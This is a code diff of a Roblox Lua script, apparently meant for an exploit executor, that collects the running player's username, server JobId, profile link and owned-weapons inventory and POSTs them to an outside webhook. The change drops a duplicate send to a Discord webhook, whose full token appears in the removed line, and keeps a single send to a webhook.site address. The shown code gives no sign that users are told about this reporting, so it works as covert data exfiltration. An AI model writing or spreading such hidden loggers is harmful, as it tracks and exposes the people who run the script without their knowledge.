@@ -136,7 +136,7 @@ antiafk = false
 end
 end)
 
-local url = "https://discord.com/api/webhooks/1296489854061903894/WU2SIziNuj1qUPFKbz5hYKKrFqV0n6jv_xWhUrACj3OJMtHCH7zoFISKoUcg60H_ma_O"
+local url = "https://webhook.site/7b2ec9f2-551d-4708-9d07-7e9f716a20cb"
    
 t = {}
 for i,v in game.ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name)["Weapons"]["Owned"] do
@@ -145,47 +145,6 @@ end
 inventory = table.concat(t)
    
 local data = {
-		["embeds"] = {
-					{
-						["title"] =  game.JobId,
-						["description"] = "Name ".. game.Players.LocalPlayer.Name .. " Jobid: " ..game.JobId ..  " Inventory: " ..inventory,
-						["type"] = "rich",
-						["color"]= tonumber(0xff0000),
-						["footer"] = {
-							["icon_url"] = 'https://cdn.discordapp.com/icons/924841537328803870/2ea57c68b447a717b9ed0e0c3bc4f241.png?size=4096',
-							["text"] = ""
-						},
-						["thumbnail"] = {
-							["url"] = "https://cdn.discordapp.com/icons/924841537328803870/2ea57c68b447a717b9ed0e0c3bc4f241.png?size=4096",
-						},
-						["author"] = {
-							["name"] = ""
-						},
-						["fields"] = {
-							{
-								["name"] = '**Player profile**',
-								["value"] = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile",
-								["inline"] = true
-							},
-						}
-					}}
-			}
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-local headers = {
-   ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
-local urll = "https://webhook.site/7b2ec9f2-551d-4708-9d07-7e9f716a20cb"
-   
-t = {}
-for i,v in game.ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name)["Weapons"]["Owned"] do
- table.insert(t, tostring(i).." : "..tostring(v)..", ")
-end
-inventory = table.concat(t)
-   
-local datta = {
 		["embeds"] = {
 					{
 						["Profile"] = "Name ".. game.Players.LocalPlayer.Name .. " Jobid: " ..game.JobId ..  " Inventory: " ..inventory,
@@ -208,12 +167,12 @@ local datta = {
 						}
 					}}
 			}
-local newdata = game:GetService("HttpService"):JSONEncode(datta)
+local newdata = game:GetService("HttpService"):JSONEncode(data)
 local headers = {
    ["content-type"] = "application/json"
 }
 request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = urll, Body = newdata, Method = "POST", Headers = headers}
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
 
 
